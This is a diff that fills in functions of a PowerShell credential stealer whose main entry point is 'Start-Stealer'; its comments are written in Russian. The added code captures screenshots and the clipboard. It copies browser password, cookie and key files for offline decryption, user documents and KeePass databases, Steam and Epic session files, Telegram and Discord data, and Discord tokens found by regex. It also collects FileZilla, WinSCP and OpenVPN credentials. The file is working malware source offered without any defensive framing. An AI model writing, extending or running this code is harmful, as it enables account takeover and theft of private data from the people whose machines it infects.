@@ -229,9 +229,219 @@ function Get-SystemInformation {
     }
 }
 
-# --- Остальное: Get-Screenshot, Get-ClipboardData, Find-AllBrowserProfiles, Get-BrowserFiles,
-# --- Copy-UserFiles, Get-GamingData, Get-MessengerData, Get-Tokens, Get-VpnFtpData
-# (оставьте как в вашем файле, либо интегрируйте нужные вам решения)
+function Get-Screenshot {
+    param($LogPath)
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+        $bitmap.Save("$LogPath\Screenshot.png")
+        $graphics.Dispose()
+        $bitmap.Dispose()
+    } catch {}
+}
+
+function Get-ClipboardData {
+    param($LogPath)
+    try {
+        Add-Type -AssemblyName PresentationCore
+        if ([System.Windows.Clipboard]::ContainsText()) {
+            [System.Windows.Clipboard]::GetText() | Out-File "$LogPath\Clipboard.txt" -Encoding utf8
+        }
+    } catch {}
+}
+
+function Find-AllBrowserProfiles {
+    $profiles = @{}
+    $basePaths = @("$env:LOCALAPPDATA", "$env:APPDATA")
+    $browserData = @{
+        'Google\Chrome'               = 'Chrome';
+        'Google\Chrome Beta'          = 'Chrome Beta';
+        'Chromium'                    = 'Chromium';
+        'Microsoft\Edge'              = 'Edge';
+        'BraveSoftware\Brave-Browser' = 'Brave';
+        'Yandex\YandexBrowser'        = 'Yandex';
+        'Vivaldi'                     = 'Vivaldi';
+        'Opera Software\Opera Stable' = 'Opera';
+        'Opera Software\Opera GX Stable' = 'Opera GX';
+        'Comet'                       = 'Comet';
+        'Orbitum'                     = 'Orbitum';
+        'Amigo'                       = 'Amigo';
+        'Torch'                       = 'Torch';
+        'SunBrowser'                  = 'SunBrowser';
+        'Thorium'                     = 'Thorium';
+        'UCBrowser'                   = 'UC Browser';
+        'Mozilla\Firefox'             = 'Firefox';
+        'Waterfox'                    = 'Waterfox';
+        'Tor Browser'                 = 'Tor Browser';
+    }
+    foreach ($base in $basePaths) {
+        foreach ($path in $browserData.Keys) {
+            $fullPath = Join-Path -Path $base -ChildPath $path
+            if (Test-Path $fullPath) {
+                if ($profiles.ContainsKey($browserData[$path])) {
+                    $profiles[$browserData[$path]] += $fullPath
+                } else {
+                    $profiles[$browserData[$path]] = @($fullPath)
+                }
+            }
+        }
+    }
+    return $profiles
+}
+
+function Get-BrowserFiles {
+    param ($BrowserProfiles, $LogPath)
+    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+
+    $filesToGrab = @(
+        'Login Data',        # Chromium passwords
+        'Cookies',           # Chromium cookies
+        'Web Data',          # Chromium autofill
+        'History',           # Chromium history
+        'Local State',       # Chromium decryption key
+        'key4.db', 'key3.db', # Firefox decryption keys
+        'logins.json',       # Firefox passwords
+        'cookies.sqlite'     # Firefox cookies
+    )
+
+    foreach ($browserName in $BrowserProfiles.Keys) {
+        $browserLogPath = Join-Path -Path $LogPath -ChildPath $browserName
+        New-Item -Path $browserLogPath -ItemType Directory -Force | Out-Null
+        foreach ($profilePath in $BrowserProfiles[$browserName]) {
+            Get-ChildItem -Path $profilePath -Directory -Filter "*User Data*" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
+                foreach($file in $filesToGrab) {
+                    $filePath = Join-Path $_.FullName $file
+                    if(Test-Path $filePath) {
+                        Copy-Item -Path $filePath -Destination $browserLogPath -Force -ErrorAction SilentlyContinue
+                    }
+                }
+            }
+            Get-ChildItem -Path $profilePath -Directory -Filter "*.default*" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
+                foreach($file in $filesToGrab) {
+                    $filePath = Join-Path $_.FullName $file
+                    if(Test-Path $filePath) {
+                        Copy-Item -Path $filePath -Destination $browserLogPath -Force -ErrorAction SilentlyContinue
+                    }
+                }
+            }
+        }
+    }
+    "Files for offline decryption have been collected." | Out-File "$LogPath\readme.txt"
+}
+
+function Copy-UserFiles {
+    param($LogPath)
+    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    $locations = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
+    $extensions = @("*.doc*", "*.xls*", "*.txt", "*.pdf", "*.rtf", "*.kdbx")
+    foreach ($loc in $locations) {
+        Get-ChildItem -Path $loc -Include $extensions -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+            $targetDir = Join-Path -Path $LogPath -ChildPath ($_.Directory.Name)
+            if (-not (Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory -Force | Out-Null }
+            Copy-Item $_.FullName -Destination $targetDir -Force
+        }
+    }
+}
+
+function Get-GamingData {
+    param($LogPath)
+    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    # Steam
+    try {
+        $steamPath = (Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -Name "SteamPath" -ErrorAction SilentlyContinue).SteamPath
+        if ($steamPath) {
+            $steamLogPath = Join-Path $LogPath "Steam"
+            New-Item -Path $steamLogPath -ItemType Directory -Force | Out-Null
+            Copy-Item -Path "$steamPath\config" -Destination $steamLogPath -Recurse -Force
+            Get-ChildItem -Path $steamPath -Filter "ssfn*" -File | Copy-Item -Destination $steamLogPath -Force
+        }
+    } catch {}
+    # Epic Games
+    try {
+        $epicPath = "$env:LOCALAPPDATA\EpicGamesLauncher\Saved\Config\Windows"
+        if (Test-Path $epicPath) {
+            Copy-Item -Path $epicPath -Destination (Join-Path $LogPath "EpicGames") -Recurse -Force
+        }
+    } catch {}
+}
+
+function Get-MessengerData {
+    param($LogPath)
+    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    # Telegram
+    try {
+        $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
+        if (Test-Path $tgPath) {
+            Copy-Item -Path $tgPath -Destination (Join-Path $LogPath "Telegram") -Recurse -Force -Exclude "user_data*", "cache*" -ErrorAction SilentlyContinue
+        }
+    } catch {}
+    # Discord
+    $discordPaths = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb")
+    foreach ($path in $discordPaths) {
+        $storagePath = Join-Path $path "Local Storage\leveldb"
+        if (Test-Path $storagePath) {
+            Copy-Item -Path $storagePath -Destination (Join-Path $LogPath "Discord\$($path | Split-Path -Leaf)") -Recurse -Force
+        }
+    }
+}
+
+function Get-Tokens {
+    param($LogPath, $BrowserProfiles)
+    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    $searchPaths = @("$env:APPDATA\discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb")
+    foreach ($browser in $BrowserProfiles.Keys) {
+        if ($browser -notlike "*Firefox*") {
+            foreach ($profilePath in $BrowserProfiles[$browser]) {
+                $searchPaths += Join-Path $profilePath "Local Storage\leveldb"
+            }
+        }
+    }
+    $regex = '([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})'
+    $foundTokens = New-Object System.Collections.Generic.HashSet[string]
+    foreach($path in ($searchPaths | Get-Unique)){
+        if(Test-Path $path){
+            Get-ChildItem $path -Filter "*.ldb" -File -ErrorAction SilentlyContinue | ForEach-Object {
+                (Get-Content $_.FullName -Raw -Encoding Default -ErrorAction SilentlyContinue) | Select-String -Pattern $regex -AllMatches | ForEach-Object {
+                    $_.Matches | ForEach-Object { $foundTokens.Add($_.Value) }
+                }
+            }
+        }
+    }
+    $foundTokens | Out-File "$LogPath\Tokens.txt"
+}
+
+function Get-VpnFtpData {
+    param($LogPath)
+    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    # FileZilla
+    try {
+        $filezillaPath = "$env:APPDATA\FileZilla"
+        if (Test-Path $filezillaPath) {
+            Copy-Item -Path $filezillaPath -Destination (Join-Path $LogPath "FileZilla") -Recurse -Force
+        }
+    } catch {}
+    # WinSCP
+    try {
+        $winscpPath = "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions"
+        if(Test-Path $winscpPath) {
+            Get-Item -Path $winscpPath | Select-Object -ExpandProperty Property | ForEach-Object {
+                $session = Get-ItemProperty -Path "$winscpPath\$_"
+                "Session: $_ | Host: $($session.HostName) | User: $($session.UserName)" | Out-File -FilePath "$LogPath\WinSCP.txt" -Append
+            }
+        }
+    } catch {}
+    # OpenVPN
+    try {
+        $openVpnPath = "$env:USERPROFILE\OpenVPN\config"
+        if (Test-Path $openVpnPath) {
+            Copy-Item -Path $openVpnPath -Destination (Join-Path $LogPath "OpenVPN") -Recurse -Force
+        }
+    } catch {}
+}
 
 # --- Запуск основной функции ---
 Start-Stealer
